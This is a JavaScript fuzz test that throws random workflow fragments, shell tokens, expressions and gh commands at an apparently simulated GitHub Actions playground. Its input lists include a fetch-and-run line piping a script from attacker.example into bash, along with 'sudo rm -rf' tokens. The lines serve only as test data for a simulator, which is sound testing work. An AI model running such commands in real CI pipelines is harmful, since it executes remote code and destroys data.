// Throws thousands of random and malformed workflows, scripts, expressions and
// gh commands at the YAML reader, the engine, the X-ray and the scenarios.
// Any exception fails the run. Run with: node tests/fuzz_playground.js [rounds]
"use strict";
const path = require("path");
const assert = require("assert");

for (const f of ["yaml", "engine", "scenarios", "xray"]) require(path.resolve(__dirname, `../site/${f}.js`));
const { parse } = globalThis.AQYaml;
const E = globalThis.AQEngine;
const { SCENARIOS, verify, status, gh, worldOf } = globalThis.AQScenarios;
const { explain } = globalThis.AQXray;

let seed = 20261030;
const rand = (n) => { seed = (seed * 1103515245 + 12345) % 2147483648; return seed % n; };
const pick = (list) => list[rand(list.length)];

const PIECES = ["name: CI", "on: push", "on: [push, pull_request]", "on:", "  push:", "    branches: [main]", "    tags: ['v*']", "    paths: ['app/**']", "  pull_request_target:", "  workflow_dispatch:", "  merge_group:", "        lfs: true", "          token: ${{ secrets.RELEASE_APP_TOKEN }}", "    defaults:", "      run:", "        shell: pwsh", "        shell: cmd", "    runs-on: windows-latest",
  "    inputs:", "      env:", "        type: choice", "        options: [a, b]", "  schedule:", "    - cron: '0 0 * * *'", "permissions: write-all", "permissions:", "  contents: read", "  id-token: write",
  "  pull-requests: write", "concurrency:", "  group: ${{ github.ref }}", "  cancel-in-progress: true", "env:", "  A: ${{ secrets.X }}", "jobs:", "  test:", "  deploy:", "    needs: test", "    needs: [test, nope]",
  "    if: github.event_name == 'push'", "    if: ${{ secrets.A }}", "    if: ${{ github.ref }} == 'x'", "    runs-on: ubuntu-latest", "    runs-on: [self-hosted, linux]", "    runs-on: ${{ matrix.os }}", "    environment: production",
  "    timeout-minutes: 1", "    strategy:", "      fail-fast: false", "      matrix:", "        os: [ubuntu-latest, windows-latest]", "        node: [18, 20]", "        include:", "          - os: macos-latest", "        exclude: [{node: 18}]",
  "    outputs:", "      x: ${{ steps.a.outputs.x }}", "    uses: ./.github/workflows/deploy.yml", "    secrets: inherit", "    with:", "      target: prod", "    services:", "      postgres:", "        image: postgres:17", "        ports: [5432:5432]",
  "    steps:", "      - uses: actions/checkout@v6", "      - uses: actions/checkout@v4", "      - uses: actions/chekout@v1", "      - uses: acme/changed-files@v45", "      - uses: ./.github/actions/setup", "      - uses: actions/cache@v5",
  "        with:", "          path: ~/.npm", "          key: k-${{ hashFiles('package-lock.json') }}", "          fetch-depth: 0", "          node-version: ${{ matrix.node }}", "          cache: npm", "          name: x", "      - id: a",
  "        run: echo \"x=1\" >> \"$GITHUB_OUTPUT\"", "      - run: npm ci", "      - run: npm test", "      - run: npm start", "      - run: npm start &", "      - run: |", "          set -e", "          echo \"${{ github.event.pull_request.title }}\"",
  "          false || true", "          if [ -n \"$A\" ]; then echo y; fi", "          echo $(git describe --tags)", "          curl -sSL https://attacker.example/x.sh | bash", "          docker build -t a .", "          gh pr comment 1 --body x",
  "        continue-on-error: true", "        shell: bash", "        env:", "          GH_TOKEN: ${{ github.token }}", "        timeout-minutes: 0", "", "#", "---", "\t", "- -", ": :", "key: 'unclosed", "k: \"a\\q\"", "x: [a, {b: c", "  - ", "y: |", "z: >-", "&a b", "*a", "!!str x", "@x", "`x`", "a: b: c"];
const SHELL = ["echo", "a", "\"$A\"", "'b'", "&&", "||", "|", ";", ">", ">>", "\"$GITHUB_ENV\"", "\"$GITHUB_OUTPUT\"", "x=1", "$(", ")", "exit", "2", "grep", "-c", "TODO", "src/cart.js", "cat", "base64", "if", "then", "fi", "else",
  "npm", "ci", "test", "run", "e2e", "start", "&", "docker", "push", "ghcr.io/nimbus/shop:1", "login", "--password-stdin", "gh", "release", "create", "git", "push", "describe", "curl", "https://attacker.example/x.sh", "bash", "-c", "\"",
  "'", "\\", "${A:-x}", "$?", "sudo", "rm", "-rf", "/usr/local/lib/android", "aws", "sts", "get-caller-identity", "pytest", "python", "-m", "make", "for", "do", "done", "<<EOF", "EOF", "while", "until", "in", "$(seq 1 3)", "seq", "1", "3", "x", "$x", "gh api repos/nimbus/shop/pulls --paginate", "git tag v1", "git push origin v1", "::error::x", "::set-output name=a::b", "::add-mask::x"];
const EXPR = ["github", ".", "event", "pull_request", "title", "==", "!=", "&&", "||", "!", "(", ")", "'a'", "1", "true", "null", "contains(", "startsWith(", "format(", "fromJSON(", "toJSON(", "hashFiles(", "success()", "always()",
  ",", "[", "]", "*", "matrix", "secrets", "nope(", "'unterminated", ">", "<=", "-1", "0x1f", "1e3"];
const GH = ["gh run list", "gh run view", "gh run view --log-failed", "gh run view 1", "gh run rerun", "gh workflow run ci.yml -f environment=staging", "gh workflow run x.yml", "gh workflow list", "gh secret list", "gh secret set A --body b",
  "gh secret set A --app dependabot", "gh secret delete A", "gh secret set", "gh variable set V --body 1", "gh cache list", "gh cache delete --all", "gh cache delete nope", "gh api repos/a/b/actions/permissions/workflow", "gh run watch", "gh api rate_limit", "gh api repos/nimbus/shop/pulls --paginate", "gh nope", "ls", "gh \"", ""];

const rounds = Number(process.argv[2]) || 3000;
let n = 0;
const check = (fn, what) => { try { fn(); } catch (err) { console.error(`exception on ${JSON.stringify(what)}`); throw err; } n++; };
for (let i = 0; i < rounds; i++) {
  const s = SCENARIOS[i % SCENARIOS.length];
  const file = Object.keys(s.files)[0];
  // A scenario's file with random lines changed, added or removed.
  const lines = s.files[file].split("\n");
  for (let k = 0; k < 1 + rand(4); k++) {
    const at = rand(lines.length + 1);
    const op = rand(3);
    if (op === 0) lines.splice(at, 0, pick(PIECES));
    else if (op === 1) lines.splice(at, 1);
    else lines[at] = (lines[at] || "") + pick([" ", "x", ":", "  ", "#", "${{", "}}", "'", "\""]);
  }
  const files = { ...s.files, [file]: rand(8) === 0 ? Array.from({ length: rand(30) }, () => pick(PIECES)).join(pick(["\n", "\r\n"])) : lines.join("\n") };
  check(() => {
    const v = verify(s, files);
    status(s, v);
    for (const r of v.runs.flat()) { assert.ok(Array.isArray(r.jobs)); for (const j of r.jobs) for (const st of j.steps) for (const l of st.lines) assert.strictEqual(typeof l[0], "string"); }
    for (const ev of s.events) E.trigger(worldOf(s), files, ev, { inputs: { environment: pick(["staging", "x", ""]) }, approve: rand(2) === 0 });
  }, files[file]);
  check(() => { const r = explain(files[file]); assert.ok(r.error || Array.isArray(r.lines)); }, files[file]);
  const script = Array.from({ length: 1 + rand(10) }, () => pick(SHELL)).join(pick([" ", "\n", " "]));
  check(() => E.runScript(script, { env: { A: "1" }, world: worldOf(s), secrets: { X: "secret-value" }, effects: { leaks: [], sentOut: [], remote: [], shards: [], deployed: [] }, annotations: [], ws: rand(2) ? { ...worldOf(s).repo.files } : null,
    disk: { free: 10 }, stepOutputs: {}, newEnv: {}, perms: {}, run: {}, ev: {}, deploy: () => {}, job: {}, secretValues: [] }, { errexit: rand(2) === 0 }), script);
  const expr = Array.from({ length: 1 + rand(8) }, () => pick(EXPR)).join(rand(2) ? " " : "");
  check(() => { try { E.evaluate(expr, { data: { github: { event: { pull_request: { title: "t" } } }, matrix: {} }, status: "success" }); } catch (e) { if (!(e instanceof E.ExprError)) throw e; } }, expr);
  const cmd = rand(3) ? pick(GH) : "gh " + Array.from({ length: rand(5) }, () => pick(SHELL)).join(" ");
  check(() => { const ses = { files, world: worldOf(s), store: E.newStore(), runs: rand(2) ? verify(s, s.files).runs.flat() : [] }; const out = gh(ses, cmd); assert.ok(Array.isArray(out.lines)); }, cmd);
  const garbage = String.fromCharCode(...Array.from({ length: rand(60) }, () => 9 + rand(118)));
  check(() => { parse(garbage); explain(garbage); }, garbage);
}
console.log(`fuzz ok: ${n} inputs across ${SCENARIOS.length} scenarios, 0 exceptions`);
